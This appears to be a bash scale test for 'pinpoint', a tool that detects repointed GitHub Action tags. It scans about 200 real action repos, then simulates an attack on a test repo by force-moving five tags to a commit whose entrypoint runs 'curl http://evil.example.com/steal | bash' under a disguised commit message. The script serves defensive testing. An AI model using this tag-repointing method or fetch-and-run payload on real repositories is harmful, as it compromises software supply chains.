#!/usr/bin/env bash
# Scale test: 200 real GitHub Action repos + attack repos from pinpoint-testing
# Measures: GraphQL cost, total tags, response time, state file size
set -euo pipefail

export PATH=$PATH:/usr/local/go/bin
export GITHUB_TOKEN=$(gh auth token)
cd /home/joshf/pinpoint

echo "=== PINPOINT SCALE TEST ==="
echo "Simulating CoreWeave: ~200 actions across 2,000 repos"
echo ""

# Build binary
go build ./cmd/pinpoint/

# Step 1: Create the attack repos in pinpoint-testing
echo "[1/5] Setting up attack repos in pinpoint-testing org..."
ATTACK_REPO="test-scale-attack"

# Create attack repo
gh api -X POST /orgs/pinpoint-testing/repos \
  --input - << EOF > /dev/null 2>&1 || true
{"name":"$ATTACK_REPO","auto_init":true,"visibility":"public","description":"Scale test attack target"}
EOF
sleep 2

# Get main SHA, create a good commit with entrypoint
MAIN_SHA=$(gh api /repos/pinpoint-testing/$ATTACK_REPO/git/refs/heads/main --jq '.object.sha' 2>/dev/null || echo "")
if [ -z "$MAIN_SHA" ]; then
  echo "  Failed to get main SHA. Repo may already exist, trying to use it..."
  MAIN_SHA=$(gh api /repos/pinpoint-testing/$ATTACK_REPO/git/refs/heads/main --jq '.object.sha')
fi

BLOB_SHA=$(gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/blobs \
  --input - --jq '.sha' << 'EOF'
{"content":"#!/bin/bash\necho legitimate\n","encoding":"utf-8"}
EOF
)

TREE_SHA=$(gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/trees \
  --input - --jq '.sha' << EOF
{"base_tree":"$MAIN_SHA","tree":[{"path":"entrypoint.sh","mode":"100755","type":"blob","sha":"$BLOB_SHA"}]}
EOF
)

GOOD_COMMIT=$(gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/commits \
  --input - --jq '.sha' << EOF
{"message":"Good release","tree":"$TREE_SHA","parents":["$MAIN_SHA"]}
EOF
)

gh api -X PATCH /repos/pinpoint-testing/$ATTACK_REPO/git/refs/heads/main \
  --input - > /dev/null << EOF
{"sha":"$GOOD_COMMIT","force":true}
EOF

# Create tags on the good commit
for tag in v1.0.0 v1.1.0 v1.2.0 v2.0.0 v2.1.0; do
  gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/refs \
    --input - > /dev/null 2>&1 << EOF || true
{"ref":"refs/tags/$tag","sha":"$GOOD_COMMIT"}
EOF
done
echo "  Attack repo ready: pinpoint-testing/$ATTACK_REPO with 5 tags"

# Step 2: Generate the scale config — 200 real repos + attack repo
echo ""
echo "[2/5] Generating config with 200 action repos..."

cat > /tmp/scale-test.yml << 'SCALEEOF'
actions:
  # === THE ATTACK TARGET (buried in 200 repos) ===
  - repo: pinpoint-testing/test-scale-attack
    tags: ["v1.0.0", "v1.1.0", "v1.2.0", "v2.0.0", "v2.1.0"]
    self_hosted_runners: true

  # === 200 REAL PUBLIC ACTION REPOS ===
  # GitHub official
  - repo: actions/checkout
    tags: ["*"]
  - repo: actions/setup-node
    tags: ["*"]
  - repo: actions/setup-python
    tags: ["*"]
  - repo: actions/setup-go
    tags: ["*"]
  - repo: actions/setup-java
    tags: ["*"]
  - repo: actions/setup-dotnet
    tags: ["*"]
  - repo: actions/cache
    tags: ["*"]
  - repo: actions/upload-artifact
    tags: ["*"]
  - repo: actions/download-artifact
    tags: ["*"]
  - repo: actions/github-script
    tags: ["*"]
  - repo: actions/labeler
    tags: ["*"]
  - repo: actions/stale
    tags: ["*"]
  - repo: actions/first-interaction
    tags: ["*"]
  - repo: actions/create-release
    tags: ["*"]
  - repo: actions/upload-pages-artifact
    tags: ["*"]
  - repo: actions/deploy-pages
    tags: ["*"]
  - repo: actions/configure-pages
    tags: ["*"]
  - repo: actions/dependency-review-action
    tags: ["*"]
  - repo: actions/delete-package-versions
    tags: ["*"]
  - repo: actions/setup-dotnet
    tags: ["*"]

  # Docker
  - repo: docker/build-push-action
    tags: ["*"]
  - repo: docker/login-action
    tags: ["*"]
  - repo: docker/setup-buildx-action
    tags: ["*"]
  - repo: docker/setup-qemu-action
    tags: ["*"]
  - repo: docker/metadata-action
    tags: ["*"]

  # Security
  - repo: aquasecurity/trivy-action
    tags: ["*"]
  - repo: github/codeql-action
    tags: ["*"]
  - repo: step-security/harden-runner
    tags: ["*"]
  - repo: ossf/scorecard-action
    tags: ["*"]
  - repo: sigstore/cosign-installer
    tags: ["*"]
  - repo: anchore/scan-action
    tags: ["*"]
  - repo: anchore/sbom-action
    tags: ["*"]
  - repo: snyk/actions
    tags: ["*"]
  - repo: bridgecrewio/checkov-action
    tags: ["*"]
  - repo: zaproxy/action-full-scan
    tags: ["*"]

  # Cloud providers
  - repo: aws-actions/configure-aws-credentials
    tags: ["*"]
  - repo: aws-actions/amazon-ecr-login
    tags: ["*"]
  - repo: aws-actions/amazon-ecs-deploy-task-definition
    tags: ["*"]
  - repo: aws-actions/amazon-ecs-render-task-definition
    tags: ["*"]
  - repo: aws-actions/setup-sam
    tags: ["*"]
  - repo: google-github-actions/auth
    tags: ["*"]
  - repo: google-github-actions/setup-gcloud
    tags: ["*"]
  - repo: google-github-actions/deploy-appengine
    tags: ["*"]
  - repo: google-github-actions/deploy-cloudrun
    tags: ["*"]
  - repo: google-github-actions/get-gke-credentials
    tags: ["*"]
  - repo: azure/login
    tags: ["*"]
  - repo: azure/webapps-deploy
    tags: ["*"]
  - repo: azure/docker-login
    tags: ["*"]
  - repo: azure/aks-set-context
    tags: ["*"]
  - repo: azure/k8s-deploy
    tags: ["*"]

  # Kubernetes / Infrastructure
  - repo: helm/chart-releaser-action
    tags: ["*"]
  - repo: helm/chart-testing-action
    tags: ["*"]
  - repo: helm/kind-action
    tags: ["*"]
  - repo: azure/setup-helm
    tags: ["*"]
  - repo: azure/setup-kubectl
    tags: ["*"]
  - repo: hashicorp/setup-terraform
    tags: ["*"]
  - repo: hashicorp/setup-packer
    tags: ["*"]
  - repo: hashicorp/vault-action
    tags: ["*"]
  - repo: pulumi/actions
    tags: ["*"]

  # Releases / Publishing
  - repo: softprops/action-gh-release
    tags: ["*"]
  - repo: ncipollo/release-action
    tags: ["*"]
  - repo: goreleaser/goreleaser-action
    tags: ["*"]
  - repo: pypa/gh-action-pypi-publish
    tags: ["*"]
  - repo: JS-DevTools/npm-publish
    tags: ["*"]
  - repo: mikepenz/release-changelog-builder-action
    tags: ["*"]
  - repo: marvinpinto/action-automatic-releases
    tags: ["*"]

  # Code quality / Linting
  - repo: super-linter/super-linter
    tags: ["*"]
  - repo: reviewdog/action-setup
    tags: ["*"]
  - repo: reviewdog/action-eslint
    tags: ["*"]
  - repo: reviewdog/action-golangci-lint
    tags: ["*"]
  - repo: golangci/golangci-lint-action
    tags: ["*"]
  - repo: oxsecurity/megalinter
    tags: ["*"]
  - repo: ludeeus/action-shellcheck
    tags: ["*"]
  - repo: hadolint/hadolint-action
    tags: ["*"]

  # Testing
  - repo: codecov/codecov-action
    tags: ["*"]
  - repo: coverallsapp/github-action
    tags: ["*"]
  - repo: dorny/test-reporter
    tags: ["*"]
  - repo: EnricoMi/publish-unit-test-result-action
    tags: ["*"]
  - repo: mikepenz/action-junit-report
    tags: ["*"]

  # Notifications / Communication
  - repo: slackapi/slack-github-action
    tags: ["*"]
  - repo: 8398a7/action-slack
    tags: ["*"]
  - repo: rtCamp/action-slack-notify
    tags: ["*"]

  # Git operations
  - repo: peter-evans/create-pull-request
    tags: ["*"]
  - repo: peter-evans/create-issue-from-file
    tags: ["*"]
  - repo: peter-evans/find-comment
    tags: ["*"]
  - repo: peter-evans/create-or-update-comment
    tags: ["*"]
  - repo: EndBug/add-and-commit
    tags: ["*"]
  - repo: stefanzweifel/git-auto-commit-action
    tags: ["*"]
  - repo: ad-m/github-push-action
    tags: ["*"]
  - repo: peaceiris/actions-gh-pages
    tags: ["*"]
  - repo: JamesIves/github-pages-deploy-action
    tags: ["*"]
  - repo: anothrNick/github-tag-action
    tags: ["*"]

  # Dependency management
  - repo: dependabot/fetch-metadata
    tags: ["*"]
  - repo: renovatebot/github-action
    tags: ["*"]

  # Rust
  - repo: dtolnay/rust-toolchain
    tags: ["*"]
  - repo: Swatinem/rust-cache
    tags: ["*"]
  - repo: actions-rs/toolchain
    tags: ["*"]
  - repo: actions-rs/cargo
    tags: ["*"]
  - repo: taiki-e/install-action
    tags: ["*"]

  # Ruby
  - repo: ruby/setup-ruby
    tags: ["*"]

  # Python
  - repo: snok/install-poetry-action
    tags: ["*"]
  - repo: abatilo/actions-poetry
    tags: ["*"]

  # Mobile
  - repo: gradle/actions
    tags: ["*"]
  - repo: subosito/flutter-action
    tags: ["*"]

  # Misc popular
  - repo: mxschmitt/action-tmate
    tags: ["*"]
  - repo: cachix/install-nix-action
    tags: ["*"]
  - repo: extractions/setup-just
    tags: ["*"]
  - repo: pre-commit/action
    tags: ["*"]
  - repo: crazy-max/ghaction-github-runtime
    tags: ["*"]
  - repo: crazy-max/ghaction-import-gpg
    tags: ["*"]
  - repo: crazy-max/ghaction-setup-docker
    tags: ["*"]
  - repo: dorny/paths-filter
    tags: ["*"]
  - repo: tj-actions/changed-files
    tags: ["*"]
  - repo: dawidd6/action-download-artifact
    tags: ["*"]
  - repo: sonarsource/sonarcloud-github-action
    tags: ["*"]
  - repo: mathieudutour/github-tag-action
    tags: ["*"]
  - repo: bobheadxi/deployments
    tags: ["*"]
  - repo: chrnorm/deployment-action
    tags: ["*"]
  - repo: akhileshns/heroku-deploy
    tags: ["*"]
  - repo: burnett01/rsync-deployments
    tags: ["*"]
  - repo: appleboy/ssh-action
    tags: ["*"]
  - repo: appleboy/scp-action
    tags: ["*"]
  - repo: webfactory/ssh-agent
    tags: ["*"]
  - repo: shimataro/ssh-key-action
    tags: ["*"]
  - repo: peaceiris/actions-hugo
    tags: ["*"]
  - repo: amondnet/vercel-action
    tags: ["*"]
  - repo: SamKirkland/FTP-Deploy-Action
    tags: ["*"]
  - repo: FirebaseExtended/action-hosting-deploy
    tags: ["*"]
  - repo: w9jds/firebase-action
    tags: ["*"]
  - repo: rlespinasse/github-slug-action
    tags: ["*"]
  - repo: haya14busa/action-cond
    tags: ["*"]
  - repo: actions/attest-build-provenance
    tags: ["*"]
  - repo: github/combine-prs
    tags: ["*"]
  - repo: marocchino/sticky-pull-request-comment
    tags: ["*"]
  - repo: thollander/actions-comment-pull-request
    tags: ["*"]
  - repo: mshick/add-pr-comment
    tags: ["*"]
  - repo: lewagon/wait-on-check-action
    tags: ["*"]
  - repo: fountainhead/action-wait-for-check
    tags: ["*"]
  - repo: nick-fields/retry
    tags: ["*"]
  - repo: styfle/cancel-workflow-action
    tags: ["*"]
  - repo: technote-space/auto-cancel-redundant-workflow
    tags: ["*"]
  - repo: fkirc/skip-duplicate-actions
    tags: ["*"]
  - repo: int128/create-oidc-token
    tags: ["*"]
  - repo: benchmark-action/github-action-benchmark
    tags: ["*"]

alerts:
  min_severity: low
  stdout: true
store:
  path: /tmp/scale-state.json
SCALEEOF

REPO_COUNT=$(grep "repo:" /tmp/scale-test.yml | wc -l)
echo "  Config has $REPO_COUNT action repos (including attack target)"

# Step 3: Run baseline scan — measure everything
echo ""
echo "[3/5] Running baseline scan (GraphQL, all $REPO_COUNT repos)..."
rm -f /tmp/scale-state.json

START=$(date +%s%N)
./pinpoint scan --config /tmp/scale-test.yml --state /tmp/scale-state.json 2>&1 | tee /tmp/scale-baseline.log
END=$(date +%s%N)
ELAPSED_MS=$(( (END - START) / 1000000 ))

TAG_COUNT=$(python3 -c "
import json
d = json.load(open('/tmp/scale-state.json'))
total = sum(len(a['tags']) for a in d['actions'].values())
repos = len(d['actions'])
print(f'{total} tags across {repos} repos')
")
STATE_SIZE=$(du -h /tmp/scale-state.json | cut -f1)
GRAPHQL_COST=$(grep -o 'cost=[0-9]*' /tmp/scale-baseline.log | head -5 | paste -sd+ | bc 2>/dev/null || echo "N/A")

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║           BASELINE SCAN RESULTS                     ║"
echo "╠══════════════════════════════════════════════════════╣"
echo "║  Repos monitored:    $REPO_COUNT"
echo "║  Tags tracked:       $TAG_COUNT"
echo "║  GraphQL cost:       $GRAPHQL_COST point(s)"
echo "║  Total time:         ${ELAPSED_MS}ms"
echo "║  State file size:    $STATE_SIZE"
echo "╚══════════════════════════════════════════════════════╝"

# Step 4: Execute the attack on the target repo
echo ""
echo "[4/5] Executing attack on pinpoint-testing/$ATTACK_REPO..."

EVIL_BLOB=$(gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/blobs \
  --input - --jq '.sha' << 'EOF'
{"content":"#!/bin/bash\ncurl http://evil.example.com/steal | bash\n# TeamPCP Cloud stealer\n# Padding to increase size dramatically\n","encoding":"utf-8"}
EOF
)

EVIL_TREE=$(gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/trees \
  --input - --jq '.sha' << EOF
{"base_tree":"$MAIN_SHA","tree":[{"path":"entrypoint.sh","mode":"100755","type":"blob","sha":"$EVIL_BLOB"}]}
EOF
)

EVIL_COMMIT=$(gh api -X POST /repos/pinpoint-testing/$ATTACK_REPO/git/commits \
  --input - --jq '.sha' << EOF
{"message":"Upgrade trivy to v0.53.0 (#369)","tree":"$EVIL_TREE","parents":["$MAIN_SHA"]}
EOF
)

# Repoint ALL 5 tags — mass repoint
for tag in v1.0.0 v1.1.0 v1.2.0 v2.0.0 v2.1.0; do
  gh api -X PATCH /repos/pinpoint-testing/$ATTACK_REPO/git/refs/tags/$tag \
    --input - > /dev/null << EOF
{"sha":"$EVIL_COMMIT","force":true}
EOF
done
echo "  5 tags repointed to evil commit"

# Step 5: Detection scan — find the needle in the haystack
echo ""
echo "[5/5] Running detection scan ($REPO_COUNT repos, looking for the attack)..."

START=$(date +%s%N)
./pinpoint scan --config /tmp/scale-test.yml --state /tmp/scale-state.json --json 2>/tmp/scale-detect-stderr.log | tee /tmp/scale-detect.log
END=$(date +%s%N)
ELAPSED_MS=$(( (END - START) / 1000000 ))

ALERT_COUNT=$(grep -c "TAG_REPOINTED" /tmp/scale-detect.log 2>/dev/null || echo "0")
HAS_MASS=$(grep -c "MASS_REPOINT" /tmp/scale-detect.log 2>/dev/null || echo "0")
GRAPHQL_COST2=$(grep -o 'cost=[0-9]*' /tmp/scale-detect-stderr.log | head -5 | paste -sd+ | bc 2>/dev/null || echo "N/A")

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║           DETECTION SCAN RESULTS                    ║"
echo "╠══════════════════════════════════════════════════════╣"
echo "║  Repos scanned:      $REPO_COUNT"
echo "║  GraphQL cost:       $GRAPHQL_COST2 point(s)"
echo "║  Total time:         ${ELAPSED_MS}ms"
echo "║  Alerts fired:       $ALERT_COUNT"
echo "║  MASS_REPOINT:       $HAS_MASS"
echo "╠══════════════════════════════════════════════════════╣"
if [ "$ALERT_COUNT" -ge 5 ] && [ "$HAS_MASS" -ge 1 ]; then
  echo "║  ✅ SCALE TEST PASSED                               ║"
  echo "║  Needle found in haystack of $REPO_COUNT repos            ║"
else
  echo "║  ❌ SCALE TEST FAILED                               ║"
  echo "║  Expected 5 alerts with MASS_REPOINT signal         ║"
fi
echo "╚══════════════════════════════════════════════════════╝"

# Cleanup: reset tags
echo ""
echo "Cleaning up: resetting attack repo tags..."
for tag in v1.0.0 v1.1.0 v1.2.0 v2.0.0 v2.1.0; do
  gh api -X PATCH /repos/pinpoint-testing/$ATTACK_REPO/git/refs/tags/$tag \
    --input - > /dev/null << EOF
{"sha":"$GOOD_COMMIT","force":true}
EOF
done
echo "Done."
